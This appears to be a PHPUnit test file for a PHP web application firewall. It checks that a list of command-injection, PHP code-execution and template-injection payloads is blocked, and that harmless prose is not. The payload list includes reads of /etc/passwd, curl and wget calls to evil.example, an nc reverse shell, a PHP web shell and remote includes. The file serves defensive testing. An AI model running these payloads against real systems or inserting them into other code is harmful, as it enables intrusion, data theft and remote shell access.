<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature\Adversarial\Waf;

use PHPUnit\Framework\Attributes\DataProvider;
use Mixudev\SecurityDefense\Tests\Feature\Adversarial\Concerns\RegistersWafProbeRoute;
use Mixudev\SecurityDefense\Tests\TestCase;

/**
 * OS command injection, RCE, and PHP code execution corpus.
 *
 * Attacker POV: shell metacharacters, command substitution, PHP tags and
 * superglobals, base64/eval chains, and template injection gadgets.
 */
class CommandInjectionVectorsTest extends TestCase
{
    use RegistersWafProbeRoute;

    protected function setUp(): void
    {
        parent::setUp();
        $this->registerWafProbeRoutes();
        $this->withoutAutoJail();
    }

    #[DataProvider('payloadProvider')]
    public function test_query_rce_is_blocked(string $payload): void
    {
        $result = $this->probeGet($payload, '198.18.4.1');
        $this->assertSame(403, $result['status'], "Query RCE not blocked: {$payload}");
    }

    #[DataProvider('payloadProvider')]
    public function test_form_rce_is_blocked(string $payload): void
    {
        $result = $this->probeForm('cmd', $payload, '198.18.4.2');
        $this->assertSame(403, $result['status'], "Form RCE not blocked: {$payload}");
    }

    #[DataProvider('payloadProvider')]
    public function test_json_rce_is_blocked(string $payload): void
    {
        $result = $this->probeJson('cmd', $payload, '198.18.4.3');
        $this->assertSame(403, $result['status'], "JSON RCE not blocked: {$payload}");
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function payloadProvider(): array
    {
        return [
            'semicolon cat' => ['; cat /etc/passwd'],
            'ampersand cat' => ['& cat /etc/passwd'],
            'pipe cat' => ['| cat /etc/passwd'],
            'backtick' => ['`cat /etc/passwd`'],
            'dollar paren' => ['$(whoami)'],
            'semicolon whoami' => ['; whoami'],
            'pipe id' => ['| id'],
            'pipe uname' => ['| uname -a'],
            'semicolon ls' => ['; ls -la /'],
            'semicolon netstat' => ['; netstat -an'],
            'curl exfil' => ['; curl https://evil.example/collect'],
            'wget exfil' => ['| wget https://evil.example/collect'],
            'bash -c' => ['| bash -c "id"'],
            'powershell' => ['; powershell -enc AAA='],
            'cmd exe' => ['& cmd.exe /c dir'],
            'nc reverse' => ['| nc -e /bin/sh 10.0.0.1 4444'],
            'ping timeout' => ['; ping -c 1 10.0.0.1'],
            'phpinfo' => ['phpinfo()'],
            'phpinfo leading' => ['; phpinfo()'],
            'shell_exec' => ['shell_exec("id")'],
            'system' => ['system("id")'],
            'passthru' => ['passthru("id")'],
            'exec' => ['exec("id")'],
            'eval string' => ["eval('system(\"id\");')"],
            'base64_decode' => ['base64_decode("ZWNobyAidGVzdCI=")'],
            'assert string' => ["assert('system(\"id\")')"],
            'create_function' => ['create_function("$a","system($a);")'],
            'call_user_func' => ["call_user_func('system','id')"],
            'preg_replace e' => ["preg_replace('/.*/e','system(\"id\")','')"],
            'php tag' => ['<?php system($_GET["cmd"]); ?>'],
            'php short tag' => ['<?= `id` ?>'],
            'php superglobal' => ['$_GET["cmd"]'],
            'php post superglobal' => ['$_POST["payload"]'],
            'php request superglobal' => ['$_REQUEST["x"]'],
            'php cookie superglobal' => ['$_COOKIE["x"]'],
            'php files superglobal' => ['$_FILES["x"]'],
            'php server superglobal' => ['$_SERVER["HTTP_X"]'],
            'include url' => ["include 'http://evil.example/shell.txt'"],
            'require url' => ["require 'http://evil.example/shell.txt'"],
            'include php wrapper' => ["include 'php://input'"],
            'include data wrapper' => ["include 'data://text/plain;base64,PD9waHA='"],
            'include file wrapper' => ["require_once 'file:///etc/passwd'"],
            'template system' => ['{{ system("id") }}'],
            'template exec' => ['{{ exec("id") }}'],
            'template passthru' => ['{{ passthru("id") }}'],
            'template shell_exec' => ['{{ shell_exec("id") }}'],
            'template phpinfo' => ['{{ phpinfo() }}'],
            'dollar brace env' => ['${env("APP_KEY")}'],
            'dollar brace cmd' => ['${cmd("id")}'],
            'dollar brace exec' => ['${exec("id")}'],
            'twig style' => ['{{_self.env.registerUndefinedFilterCallback("exec")}}'],
            'smarty' => ['{php}system("id"){/php}'],
        ];
    }

    public function test_benign_shell_prose_is_not_blocked(): void
    {
        foreach (['run the build', 'list the files in my notes', 'my bash cheatsheet'] as $text) {
            $result = $this->probeGet($text, '198.18.4.4');
            $this->assertSame(200, $result['status'], "False positive: {$text}");
        }
    }

    public function test_benign_php_snippet_text_is_not_blocked(): void
    {
        $result = $this->probeGet('how to install a php extension', '198.18.4.5');
        $this->assertSame(200, $result['status']);
    }
}
